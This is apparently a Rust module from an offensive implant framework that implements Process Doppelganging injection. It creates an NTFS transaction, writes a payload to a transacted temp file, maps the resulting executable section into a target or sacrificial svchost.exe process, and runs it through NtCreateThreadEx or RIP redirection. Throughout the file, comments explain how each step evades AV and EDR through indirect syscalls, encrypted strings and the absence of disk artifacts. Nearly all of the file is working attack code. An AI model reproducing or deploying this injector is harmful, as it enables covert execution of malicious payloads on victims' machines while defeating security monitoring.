//! Process Doppelganging Injection via NTFS Transactions.
//!
//! # Overview
//!
//! This module implements Process Doppelganging — a stealthy injection technique
//! that leverages NTFS transactions to execute code from a file that never exists
//! on disk:
//!
//! 1. Create an NTFS transaction via `NtCreateTransaction`.
//! 2. Create a temporary file **within** the transaction via `NtCreateFile`
//!    (with the transaction handle as `RootDirectory` in `OBJECT_ATTRIBUTES`).
//! 3. Write the payload to the transacted file via `NtWriteFile`.
//! 4. Create a section backed by the transacted file via `NtCreateSection`.
//! 5. **Roll back the transaction** via `NtRollbackTransaction` — the temp file
//!    is deleted from disk but the section mapping persists in memory.
//! 6. Open (or create) the target process.
//! 7. Map the section into the target process via `NtMapViewOfSection`.
//! 8. Execute the payload via a remote thread (`NtCreateThreadEx`).
//!
//! # OPSEC Value
//!
//! - **No disk artifacts**: The transacted file is rolled back before execution,
//!   so no file ever exists on disk. Filesystem forensics find nothing.
//! - **No IAT entries**: All NT API calls go through indirect syscalls via
//!   `syscall!`. No imports from ntdll/kernel32 for injection ops.
//! - **Bypasses file-based AV scanning**: AV scanners check files on disk during
//!   `NtCreateSection`. Because the file is in a transaction, it is invisible to
//!   scanners. After rollback, the section data persists in memory.
//!
//! # Difference from Transacted Hollowing
//!
//! Transacted hollowing (`injection_transacted.rs`) creates a **suspended process**
//! and replaces its image. Doppelganging maps the section directly into an
//! **existing** target process without creating a sacrificial process. The target
//! process must already exist (or be created separately).
//!
//! # Safety
//!
//! All public functions are `unsafe`. They perform raw memory operations and
//! Windows system calls. Must only be called on Windows x86-64.

#![cfg(all(windows, feature = "transacted-hollowing"))]

use std::ffi::c_void;

// ── Constants ────────────────────────────────────────────────────────────────

/// SECTION_ALL_ACCESS.
const SECTION_ALL_ACCESS: u64 = 0x000F_001F;

/// SEC_COMMIT.
const SEC_COMMIT: u64 = 0x0800_0000;

/// PAGE_READWRITE.
const PAGE_READWRITE: u64 = 0x04;

/// PAGE_EXECUTE_READ.
const PAGE_EXECUTE_READ: u64 = 0x20;

/// PAGE_EXECUTE_READWRITE.
const PAGE_EXECUTE_READWRITE: u64 = 0x40;

/// NtCurrentProcess() pseudo-handle.
const CURRENT_PROCESS: u64 = (-1isize) as u64;

/// SYNCHRONIZE access right.
const SYNCHRONIZE: u32 = 0x00100000;

/// STANDARD_RIGHTS_REQUIRED.
const STANDARD_RIGHTS_REQUIRED: u32 = 0x000F0000;

/// TRANSACTION_ALL_ACCESS.
const TRANSACTION_ALL_ACCESS: u32 = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x3F;

/// FILE_SUPERSEDE — create or supersede the file.
const FILE_SUPERSEDE: u32 = 0x0000_0000;
/// FILE_SYNCHRONOUS_IO_NONALERT — synchronous I/O, non-alertable.
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x0000_0020;
/// FILE_NON_DIRECTORY_FILE — file must not be a directory.
const FILE_NON_DIRECTORY_FILE: u32 = 0x0000_0040;
/// GENERIC_WRITE access right.
const GENERIC_WRITE: u32 = 0x4000_0000;
/// GENERIC_READ access right.
const GENERIC_READ: u32 = 0x8000_0000;
/// FILE_ATTRIBUTE_NORMAL — normal file attributes.
const FILE_ATTRIBUTE_NORMAL: u32 = 0x0000_0080;
/// OBJ_CASE_INSENSITIVE — case-insensitive object name comparison.
const OBJ_CASE_INSENSITIVE: u32 = 0x0000_0040;

/// PROCESS_ALL_ACCESS access mask for NtOpenProcess.
const PROCESS_ALL_ACCESS: u32 = 0x001F_0FFF;

/// CREATE_SUSPENDED flag for CreateProcessW.
const CREATE_SUSPENDED: u32 = 0x00000004;

// ── NT structure definitions (x86-64 layout) ─────────────────────────────────

/// Minimal OBJECT_ATTRIBUTES (x86-64 layout).
#[repr(C)]
struct NtObjAttr {
    length: u32,
    root_directory: usize,
    object_name: usize,
    attributes: u32,
    security_descriptor: usize,
    security_quality_of_service: usize,
}

/// Minimal UNICODE_STRING (x86-64 layout).
#[repr(C)]
struct NtUnicodeStr {
    length: u16,
    maximum_length: u16,
    buffer: usize,
}

/// Minimal IO_STATUS_BLOCK (x86-64 layout).
#[repr(C)]
struct NtIoStatusBlock {
    status: usize,
    information: usize,
}

/// Counter for generating unique temp-file names.
static TEMP_FILE_COUNTER: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);

// ── Result types ─────────────────────────────────────────────────────────────

/// Result of a successful Process Doppelganging injection.
pub struct DoppelgangingResult {
    /// Handle to the target process.
    pub process_handle: usize,
    /// Handle to the remote thread executing the payload.
    pub thread_handle: usize,
    /// PID of the target process.
    pub pid: u32,
}

// ── Page alignment helper ────────────────────────────────────────────────────

fn page_align(size: usize) -> usize {
    let page = 4096;
    ((size + page - 1) / page) * page
}

// ── Transaction helpers ──────────────────────────────────────────────────────

/// Create an NTFS transaction via `NtCreateTransaction`.
///
/// Uses the indirect syscall infrastructure. Falls back to walking ntdll
/// exports for `RtlCreateTransaction` if the SSN cannot be resolved.
///
/// # OPSEC
///
/// The transaction handle is never visible to file-system minifilters that
/// are not enlisted in the transaction. Most AV/EDR file-system minifilters
/// ignore transacted file operations entirely.
unsafe fn create_transaction() -> Result<usize, String> {
    // ── Attempt 1: NtCreateTransaction via indirect syscall ──────────
    let nt_result = try_nt_create_transaction();
    match nt_result {
        Ok(handle) => {
            log::debug!(
                "injection_doppelganging: NtCreateTransaction succeeded, handle={:#x}",
                handle
            );
            return Ok(handle);
        }
        Err(reason) => {
            log::debug!(
                "injection_doppelganging: NtCreateTransaction failed ({}), trying ntdll fallback",
                reason
            );
        }
    }

    // ── Attempt 2: RtlCreateTransaction from ntdll ───────────────────
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
    if let Some(ntdll_base) = ntdll {
        let hash = pe_resolve::hash_str(b"RtlCreateTransaction\0");
        if let Some(addr) = pe_resolve::get_proc_address_by_hash(ntdll_base, hash) {
            let func: extern "system" fn(*mut c_void, u32, u32, u32, u32, u32, *mut c_void) -> i32 =
                std::mem::transmute(addr);
            let mut tx_handle: usize = 0;
            let ret = func(
                &mut tx_handle as *mut _ as *mut c_void,
                0, // lpTransactionAttributes = NULL
                0, // dwDesiredAccess = 0
                0, // dwIsolationLevel = 0
                0, // dwIsolationFlags = 0
                0, // dwTimeout = 0 (infinite)
                std::ptr::null_mut(), // dwDescription = NULL
            );
            if ret != 0 && tx_handle != 0 {
                log::debug!(
                    "injection_doppelganging: RtlCreateTransaction fallback succeeded, handle={:#x}",
                    tx_handle
                );
                return Ok(tx_handle);
            }
        }
    }

    Err("could not create NTFS transaction (NtCreateTransaction and RtlCreateTransaction both failed)".to_string())
}

/// Try NtCreateTransaction via the indirect syscall infrastructure.
unsafe fn try_nt_create_transaction() -> Result<usize, String> {
    use crate::syscalls::{do_syscall, get_syscall_id};

    let target = get_syscall_id("NtCreateTransaction").map_err(|e| format!("{}", e))?;

    // NtCreateTransaction(
    //   OUT PHANDLE TransactionHandle,
    //   IN ACCESS_MASK DesiredAccess,
    //   IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    //   IN PLARGE_INTEGER Timeout OPTIONAL,
    //   IN ULONG Unknown OPTIONAL,           // reserved, pass 0
    //   IN PUNICODE_STRING Description OPTIONAL,
    //   IN LPGUID Uow OPTIONAL               // unit of work GUID
    // )
    let mut tx_handle: usize = 0;
    let status = do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            &mut tx_handle as *mut _ as u64, // TransactionHandle
            TRANSACTION_ALL_ACCESS as u64,    // DesiredAccess
            0u64,                              // ObjectAttributes = NULL
            0u64,                              // Timeout = NULL
            0u64,                              // Unknown = 0
            0u64,                              // Description = NULL
            0u64,                              // Uow = NULL
        ],
    );

    if status < 0 {
        return Err(format!("NtCreateTransaction returned {:#x}", status as u32));
    }
    if tx_handle == 0 {
        return Err("NtCreateTransaction returned null handle".to_string());
    }
    Ok(tx_handle)
}

/// Roll back an NTFS transaction.
///
/// After rollback, all file operations within the transaction are undone —
/// files created within it are deleted from disk. Section mappings backed by
/// those files persist in memory.
unsafe fn rollback_transaction(tx_handle: usize) -> Result<(), String> {
    // ── Attempt 1: NtRollbackTransaction via indirect syscall ────────
    if let Ok(target) = crate::syscalls::get_syscall_id("NtRollbackTransaction") {
        let status = crate::syscalls::do_syscall(
            target.ssn,
            target.gadget_addr,
            &[
                tx_handle as u64, // TransactionHandle
                1u64,              // Wait = TRUE
            ],
        );
        if status >= 0 {
            log::debug!("injection_doppelganging: NtRollbackTransaction succeeded");
            return Ok(());
        }
        log::debug!(
            "injection_doppelganging: NtRollbackTransaction failed ({:#x}), trying fallback",
            status as u32
        );
    }

    // ── Attempt 2: RtlRollbackTransaction from ntdll ─────────────────
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
    if let Some(ntdll_base) = ntdll {
        let hash = pe_resolve::hash_str(b"RtlRollbackTransaction\0");
        if let Some(addr) = pe_resolve::get_proc_address_by_hash(ntdll_base, hash) {
            let func: extern "system" fn(usize, i32) -> i32 = std::mem::transmute(addr);
            let status = func(tx_handle, 1);
            if status >= 0 {
                log::debug!("injection_doppelganging: RtlRollbackTransaction succeeded");
                return Ok(());
            }
        }
    }

    // ── Attempt 3: RollbackTransaction from kernel32 ─────────────────
    let k32_hash = pe_resolve::hash_str(b"kernel32.dll\0");
    if let Some(k32) = pe_resolve::get_module_handle_by_hash(k32_hash) {
        let hash = pe_resolve::hash_str(b"RollbackTransaction\0");
        if let Some(addr) = pe_resolve::get_proc_address_by_hash(k32, hash) {
            let func: extern "system" fn(usize) -> i32 = std::mem::transmute(addr);
            let ret = func(tx_handle);
            if ret != 0 {
                log::debug!("injection_doppelganging: kernel32 RollbackTransaction succeeded");
                return Ok(());
            }
        }
    }

    Err("all rollback methods failed".to_string())
}

// ── Transacted file helpers ──────────────────────────────────────────────────

/// Create a temporary file within an NTFS transaction.
///
/// Builds an NT path (`\??\C:\Windows\Temp\~dpgXXXX.tmp`) and sets
/// `OBJECT_ATTRIBUTES.RootDirectory = tx_handle` to associate the file with
/// the transaction.
///
/// # OPSEC
///
/// The file is created within the transaction and is invisible to non-enlisted
/// file-system minifilters. After rollback, the file is deleted from disk
/// entirely — no forensic artifacts remain.
unsafe fn create_transacted_file(
    tx_handle: usize,
    payload_size: usize,
) -> Result<usize, String> {
    let aligned_size = page_align(payload_size);

    // ── Build temp file NT path ──────────────────────────────────────
    // Path: \??\C:\Windows\Temp\~dpgXXXX.tmp  (randomised suffix)
    let base_path = String::from_utf8_lossy(&string_crypt::enc_str!(
        "\\??\\C:\\Windows\\Temp\\~dpg"
    ))
    .trim_end_matches('\0')
    .to_string();

    let counter = TEMP_FILE_COUNTER.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let suffix = format!("{:04x}", counter & 0xFFFF);
    let full_path_str = format!("{}{}.tmp\0", base_path, suffix);
    let full_path: Vec<u16> = full_path_str.encode_utf16().collect();

    // Build UNICODE_STRING for the file path.
    let byte_len = (full_path.len() - 1) * 2; // exclude trailing null
    let mut uni_name = NtUnicodeStr {
        length: byte_len as u16,
        maximum_length: (byte_len + 2) as u16,
        buffer: full_path.as_ptr() as usize,
    };

    // Build OBJECT_ATTRIBUTES with RootDirectory = tx_handle.
    // This is the key to associating the file with the transaction.
    let mut oa = NtObjAttr {
        length: std::mem::size_of::<NtObjAttr>() as u32,
        root_directory: tx_handle,
        object_name: &mut uni_name as *mut _ as usize,
        attributes: OBJ_CASE_INSENSITIVE,
        security_descriptor: 0,
        security_quality_of_service: 0,
    };

    // ── Create the temp file within the transaction ──────────────────
    let mut file_handle: usize = 0;
    let mut iosb = NtIoStatusBlock {
        status: 0,
        information: 0,
    };

    // DesiredAccess: GENERIC_WRITE | SYNCHRONIZE
    // CreateDisposition: FILE_SUPERSEDE
    // CreateOptions: FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
    let create_file_status = syscall!(
        "NtCreateFile",
        &mut file_handle as *mut _ as u64,               // FileHandle
        (GENERIC_WRITE | SYNCHRONIZE) as u64,             // DesiredAccess
        &mut oa as *mut _ as u64,                          // ObjectAttributes
        &mut iosb as *mut _ as u64,                        // IoStatusBlock
        0u64,                                              // AllocationSize = NULL
        FILE_ATTRIBUTE_NORMAL as u64,                      // FileAttributes
        0u64,                                              // ShareAccess = none
        FILE_SUPERSEDE as u64,                             // CreateDisposition
        (FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE) as u64, // CreateOptions
        0u64,                                              // EaLength = 0
        0u64,                                              // EaBuffer = NULL
    );

    if create_file_status.is_err() || create_file_status.unwrap() < 0 || file_handle == 0 {
        return Err(format!(
            "NtCreateFile for transacted temp file failed: status={:?}",
            create_file_status
        ));
    }

    log::debug!(
        "injection_doppelganging: created transacted temp file handle={:#x}",
        file_handle
    );

    // ── Write placeholder data to the file ───────────────────────────
    // The file needs to be at least `aligned_size` so the section can map it.
    let zero_buf = vec![0u8; aligned_size];
    let mut iosb2 = NtIoStatusBlock {
        status: 0,
        information: 0,
    };

    let write_status = syscall!(
        "NtWriteFile",
        file_handle as u64,                                // FileHandle
        0u64,                                              // Event = NULL
        0u64,                                              // ApcRoutine = NULL
        0u64,                                              // ApcContext = NULL
        &mut iosb2 as *mut _ as u64,                       // IoStatusBlock
        zero_buf.as_ptr() as u64,                          // Buffer
        zero_buf.len() as u64,                             // Length
        0u64,                                              // ByteOffset = NULL
        0u64,                                              // Key = NULL
    );

    if write_status.is_err() || write_status.unwrap() < 0 {
        let _ = syscall!("NtClose", file_handle as u64);
        return Err(format!(
            "NtWriteFile for transacted temp file failed: status={:?}",
            write_status
        ));
    }

    log::debug!(
        "injection_doppelganging: wrote {} placeholder bytes to transacted file",
        aligned_size
    );

    Ok(file_handle)
}

/// Write the payload to a transacted file via `NtWriteFile`.
///
/// # OPSEC
///
/// The write goes through an indirect syscall — no IAT entry for WriteFile
/// or NtWriteFile. The data is written to a transacted file that will be
/// rolled back before the payload executes.
unsafe fn write_payload_to_file(file_handle: usize, payload: &[u8]) -> Result<(), String> {
    let mut iosb = NtIoStatusBlock {
        status: 0,
        information: 0,
    };

    // Write payload starting at offset 0 (overwriting the placeholder zeros).
    let mut byte_offset: i64 = 0;
    let write_status = syscall!(
        "NtWriteFile",
        file_handle as u64,                                // FileHandle
        0u64,                                              // Event = NULL
        0u64,                                              // ApcRoutine = NULL
        0u64,                                              // ApcContext = NULL
        &mut iosb as *mut _ as u64,                        // IoStatusBlock
        payload.as_ptr() as u64,                           // Buffer
        payload.len() as u64,                              // Length
        &mut byte_offset as *mut _ as u64,                 // ByteOffset = 0
        0u64,                                              // Key = NULL
    );

    if write_status.is_err() || write_status.unwrap() < 0 {
        return Err(format!(
            "NtWriteFile for payload failed: status={:?}",
            write_status
        ));
    }

    log::debug!(
        "injection_doppelganging: wrote {} payload bytes to transacted file",
        payload.len()
    );
    Ok(())
}

// ── Section helpers ──────────────────────────────────────────────────────────

/// Create a section backed by a file handle via `NtCreateSection`.
///
/// After this call the section object holds a reference to the file data.
/// Closing the file handle does not invalidate the section.
unsafe fn create_section_from_file(file_handle: usize, payload_size: usize) -> Result<usize, String> {
    let aligned_size = page_align(payload_size);
    let mut large_size: i64 = aligned_size as i64;
    let mut h_section: usize = 0;

    let status = syscall!(
        "NtCreateSection",
        &mut h_section as *mut _ as u64,               // SectionHandle
        SECTION_ALL_ACCESS,                             // DesiredAccess
        0u64,                                           // ObjectAttributes = NULL
        &mut large_size as *mut _ as u64,               // MaximumSize
        PAGE_EXECUTE_READWRITE,                         // SectionPageProtection
        SEC_COMMIT,                                     // AllocationAttributes
        file_handle as u64,                             // FileHandle (transacted file)
    );

    if status.is_err() || status.unwrap() < 0 || h_section == 0 {
        return Err(format!(
            "NtCreateSection for doppelganging section failed: status={:?}",
            status
        ));
    }

    log::debug!(
        "injection_doppelganging: created section handle={:#x}, size={}",
        h_section,
        aligned_size
    );
    Ok(h_section)
}

/// Write payload into a section by mapping it locally with RW, copying, and unmapping.
unsafe fn write_payload_to_section(
    h_section: usize,
    payload: &[u8],
) -> Result<(), String> {
    let mut local_base: *mut c_void = std::ptr::null_mut();
    let mut view_size: usize = 0;

    let map_status = syscall!(
        "NtMapViewOfSection",
        h_section as u64,
        CURRENT_PROCESS,                  // NtCurrentProcess()
        &mut local_base as *mut _ as u64,
        0u64,                              // ZeroBits
        0u64,                              // CommitSize
        0u64,                              // SectionOffset = NULL
        &mut view_size as *mut _ as u64,
        2u64,                              // ViewUnmap
        0u64,                              // AllocationType
        PAGE_READWRITE,
    );

    if map_status.is_err() || map_status.unwrap() < 0 || local_base.is_null() {
        return Err(format!(
            "NtMapViewOfSection(local RW) failed: status={:?}",
            map_status
        ));
    }

    // Write payload into local mapping.
    std::ptr::copy_nonoverlapping(payload.as_ptr(), local_base as *mut u8, payload.len());

    // Unmap from our process — the section object retains the data.
    let _ = syscall!(
        "NtUnmapViewOfSection",
        CURRENT_PROCESS,
        local_base as u64,
    );

    log::debug!(
        "injection_doppelganging: wrote {} bytes to section",
        payload.len()
    );
    Ok(())
}

/// Map a section into the target process with `PAGE_EXECUTE_READ`.
///
/// # OPSEC
///
/// The section is mapped as executable-but-not-writable. EDR scanners that
/// check for RWX pages will not flag it. The data came from a transacted file
/// that no longer exists on disk.
unsafe fn map_section_to_process(
    section_handle: usize,
    process_handle: usize,
) -> Result<usize, String> {
    let mut remote_base: *mut c_void = std::ptr::null_mut();
    let mut view_size: usize = 0;

    let map_status = syscall!(
        "NtMapViewOfSection",
        section_handle as u64,
        process_handle as u64,
        &mut remote_base as *mut _ as u64,
        0u64,
        0u64,
        0u64,
        &mut view_size as *mut _ as u64,
        2u64,                              // ViewUnmap
        0u64,
        PAGE_EXECUTE_READ,
    );

    if map_status.is_err() || map_status.unwrap() < 0 || remote_base.is_null() {
        return Err(format!(
            "NtMapViewOfSection(remote RX) failed: status={:?}",
            map_status
        ));
    }

    log::debug!(
        "injection_doppelganging: mapped section into target at {:#x}",
        remote_base as usize
    );
    Ok(remote_base as usize)
}

// ── Process / thread helpers ─────────────────────────────────────────────────

/// Open an existing process by PID via `NtOpenProcess`.
unsafe fn open_target_process(pid: u32) -> Result<usize, String> {
    let mut client_id = [0u64; 2];
    client_id[0] = pid as u64;

    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

    let mut h_proc: usize = 0;
    let status = syscall!(
        "NtOpenProcess",
        &mut h_proc as *mut _ as u64,
        PROCESS_ALL_ACCESS as u64,
        &mut obj_attr as *mut _ as u64,
        client_id.as_mut_ptr() as u64,
    );

    if status.is_err() || status.unwrap() < 0 || h_proc == 0 {
        return Err(format!(
            "NtOpenProcess({}) failed: status={:?}",
            pid, status
        ));
    }

    log::debug!(
        "injection_doppelganging: opened target process pid={}, handle={:#x}",
        pid, h_proc
    );
    Ok(h_proc)
}

/// Create a new suspended process and return its handles.
///
/// Used when no target process is specified. The process is created in a
/// suspended state so we can inject before any legitimate code runs.
unsafe fn create_suspended_process() -> Result<(usize, usize, u32), String> {
    use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};

    // Use svchost.exe as the sacrificial process — it's ubiquitous on Windows
    // and its presence does not raise suspicion.
    let path = string_crypt::enc_str!(r"C:\Windows\System32\svchost.exe");
    let path_u16: Vec<u16> = path
        .iter()
        .take_while(|&&b| b != 0)
        .map(|&b| b as u16)
        .chain(std::iter::once(0))
        .collect();

    let mut startup_info: STARTUPINFOW = std::mem::zeroed();
    startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut proc_info: PROCESS_INFORMATION = std::mem::zeroed();

    let success = CreateProcessW(
        path_u16.as_ptr() as *mut _,
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        0,                        // bInheritHandles = FALSE
        CREATE_SUSPENDED as u32,  // dwCreationFlags
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        &mut startup_info,
        &mut proc_info,
    );

    if success == 0 {
        return Err(format!(
            "CreateProcessW failed for suspended process (error: {})",
            winapi::um::errhandlingapi::GetLastError()
        ));
    }

    let pid = proc_info.dwProcessId;
    let process_handle = proc_info.hProcess as usize;
    let thread_handle = proc_info.hThread as usize;

    log::debug!(
        "injection_doppelganging: created suspended process pid={}",
        pid
    );
    Ok((process_handle, thread_handle, pid))
}

/// Create a remote thread in the target process via `NtCreateThreadEx`.
///
/// # OPSEC
///
/// Uses indirect syscall rather than CreateRemoteThread, avoiding IAT entries
/// for thread-creation APIs. EDR hooks on CreateRemoteThread are bypassed.
unsafe fn execute_payload(
    process_handle: usize,
    entry_point: usize,
) -> Result<usize, String> {
    let mut thread_handle: usize = 0;

    // NtCreateThreadEx(
    //   OUT PHANDLE ThreadHandle,
    //   IN ACCESS_MASK DesiredAccess,
    //   IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    //   IN HANDLE ProcessHandle,
    //   IN PVOID StartRoutine,
    //   IN PVOID Argument OPTIONAL,
    //   IN ULONG CreateFlags,
    //   IN SIZE_T ZeroBits,
    //   IN SIZE_T StackSize,
    //   IN SIZE_T MaximumStackSize,
    //   IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL
    // )
    let status = syscall!(
        "NtCreateThreadEx",
        &mut thread_handle as *mut _ as u64,  // ThreadHandle
        0x001FFFFFu64,                         // DesiredAccess = THREAD_ALL_ACCESS
        0u64,                                   // ObjectAttributes = NULL
        process_handle as u64,                  // ProcessHandle
        entry_point as u64,                     // StartRoutine
        0u64,                                   // Argument = NULL
        0u64,                                   // CreateFlags = 0 (run immediately)
        0u64,                                   // ZeroBits
        0u64,                                   // StackSize
        0u64,                                   // MaximumStackSize
        0u64,                                   // AttributeList = NULL
    );

    if status.is_err() || status.unwrap() < 0 || thread_handle == 0 {
        return Err(format!(
            "NtCreateThreadEx failed: status={:?}",
            status
        ));
    }

    log::debug!(
        "injection_doppelganging: created remote thread handle={:#x} at entry={:#x}",
        thread_handle, entry_point
    );
    Ok(thread_handle)
}

/// Redirect a suspended thread's RIP to the payload address.
unsafe fn redirect_thread(thread_handle: usize, payload_addr: usize) -> Result<(), String> {
    use winapi::um::processthreadsapi::{GetThreadContext, SetThreadContext};
    use winapi::um::winnt::CONTEXT;

    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = winapi::um::winnt::CONTEXT_FULL;

    if GetThreadContext(thread_handle as *mut _, &mut ctx) == 0 {
        return Err(format!(
            "GetThreadContext failed (error: {})",
            winapi::um::errhandlingapi::GetLastError()
        ));
    }

    ctx.Rip = payload_addr as u64;

    if SetThreadContext(thread_handle as *mut _, &ctx) == 0 {
        return Err(format!(
            "SetThreadContext failed (error: {})",
            winapi::um::errhandlingapi::GetLastError()
        ));
    }

    log::debug!(
        "injection_doppelganging: redirected thread RIP to {:#x}",
        payload_addr
    );
    Ok(())
}

/// Resume a suspended thread via `NtResumeThread`.
unsafe fn resume_thread(thread_handle: usize) -> Result<(), String> {
    let status = syscall!(
        "NtResumeThread",
        thread_handle as u64,
        std::ptr::null_mut() as u64, // PreviousSuspendCount = NULL
    );

    if status.is_err() || status.unwrap() < 0 {
        return Err(format!(
            "NtResumeThread failed: status={:?}",
            status
        ));
    }
    Ok(())
}

// ── Main entry point ─────────────────────────────────────────────────────────

/// Perform Process Doppelganging injection.
///
/// # Arguments
///
/// * `payload` — Shellcode or PE bytes to inject.
/// * `target_process` — Optional target process identifier. If `None`, a new
///   suspended sacrificial process is created (svchost.exe). If `Some("PID")`,
///   the process is opened by PID. If `Some("name")`, the process is found by
///   name.
///
/// # Returns
///
/// A `DoppelgangingResult` on success, or an error string on failure.
///
/// # Safety
///
/// Performs raw memory operations and Windows system calls. Must only be
/// called on Windows x86-64.
///
/// # Process Doppelganging Flow
///
/// ```text
/// NtCreateTransaction → NtCreateFile(tx) → NtWriteFile(tx)
///       → NtCreateSection(file) → NtRollbackTransaction
///       → NtMapViewOfSection(target) → NtCreateThreadEx
/// ```
pub unsafe fn doppelganging_inject(
    payload: &[u8],
    target_process: Option<&str>,
) -> Result<DoppelgangingResult, String> {
    log::info!(
        "injection_doppelganging: starting with payload size={}",
        payload.len()
    );

    // ── Step 1: Create NTFS transaction ───────────────────────────────
    // The transaction wraps all file operations so they can be rolled back.
    let tx_handle = create_transaction()?;

    log::debug!(
        "injection_doppelganging: transaction created, handle={:#x}",
        tx_handle
    );

    // ── Step 2: Create transacted temp file ───────────────────────────
    // The file is created within the transaction and populated with zeros.
    let file_handle = create_transacted_file(tx_handle, payload.len())
        .map_err(|e| {
            let _ = syscall!("NtClose", tx_handle as u64);
            e
        })?;

    // ── Step 3: Write payload to transacted file ──────────────────────
    // Overwrite the placeholder zeros with the actual payload.
    write_payload_to_file(file_handle, payload)
        .map_err(|e| {
            let _ = syscall!("NtClose", file_handle as u64);
            let _ = syscall!("NtClose", tx_handle as u64);
            e
        })?;

    // ── Step 4: Create section backed by transacted file ──────────────
    // The section now holds a snapshot of the file data.
    let h_section = create_section_from_file(file_handle, payload.len())
        .map_err(|e| {
            let _ = syscall!("NtClose", file_handle as u64);
            let _ = syscall!("NtClose", tx_handle as u64);
            e
        })?;

    // Close the file handle — the section holds its own reference.
    let _ = syscall!("NtClose", file_handle as u64);

    // ── Step 5: Roll back the transaction ─────────────────────────────
    // KEY INSIGHT: Rolling back the transaction deletes the temp file from
    // disk, but the section mapping persists in memory. The section data was
    // committed to memory when NtCreateSection was called. This is the core
    // OPSEC value: **no disk artifacts remain**.
    match rollback_transaction(tx_handle) {
        Ok(()) => {
            log::info!("injection_doppelganging: transaction rolled back — no disk artifacts");
        }
        Err(e) => {
            log::warn!(
                "injection_doppelganging: transaction rollback failed (non-fatal, payload already in section): {}",
                e
            );
        }
    }

    let _ = syscall!("NtClose", tx_handle as u64);

    // ── Step 6: Open or create target process ─────────────────────────
    let (process_handle, thread_handle, pid, is_suspended) = match target_process {
        Some(ident) => {
            // Try to parse as PID first, then as process name.
            if let Ok(pid) = ident.parse::<u32>() {
                let h_proc = open_target_process(pid)?;
                // For existing processes, we use NtCreateThreadEx (no suspended thread).
                (h_proc, 0usize, pid, false)
            } else {
                // Find process by name using NtGetNextProcess or toolhelp32.
                // For now, attempt to parse as PID and return a clear error.
                return Err(format!(
                    "process name lookup not yet implemented; pass PID numerically (got: {})",
                    ident
                ));
            }
        }
        None => {
            // Create a new suspended sacrificial process.
            let (h_proc, h_thread, pid) = create_suspended_process()?;
            (h_proc, h_thread, pid, true)
        }
    };

    log::info!(
        "injection_doppelganging: target process pid={}, handle={:#x}, suspended={}",
        pid, process_handle, is_suspended
    );

    // ── Step 7: Map section into target process ───────────────────────
    // The section is mapped as PAGE_EXECUTE_READ. The payload data came from
    // a file that no longer exists on disk.
    let remote_base = map_section_to_process(h_section, process_handle).map_err(|e| {
        if is_suspended {
            let _ = syscall!(
                "NtTerminateProcess",
                process_handle as u64,
                1u64
            );
        }
        let _ = syscall!("NtClose", process_handle as u64);
        if thread_handle != 0 {
            let _ = syscall!("NtClose", thread_handle as u64);
        }
        let _ = syscall!("NtClose", h_section as u64);
        e
    })?;

    log::debug!(
        "injection_doppelganging: payload mapped at {:#x} in target pid={}",
        remote_base, pid
    );

    // Close section handle — the target has a mapping that references it.
    let _ = syscall!("NtClose", h_section as u64);

    // ── Step 8: Execute payload ───────────────────────────────────────
    let exec_thread_handle = if is_suspended {
        // For a suspended process, redirect the primary thread's RIP.
        redirect_thread(thread_handle, remote_base)?;
        resume_thread(thread_handle)?;
        thread_handle
    } else {
        // For an existing process, create a new remote thread.
        execute_payload(process_handle, remote_base)?
    };

    log::info!(
        "injection_doppelganging: injection complete — pid={}, base={:#x}",
        pid, remote_base
    );

    Ok(DoppelgangingResult {
        process_handle,
        thread_handle: exec_thread_handle,
        pid,
    })
}

// ── Unit tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_page_align() {
        assert_eq!(page_align(0), 0);
        assert_eq!(page_align(1), 4096);
        assert_eq!(page_align(4096), 4096);
        assert_eq!(page_align(4097), 8192);
    }
}
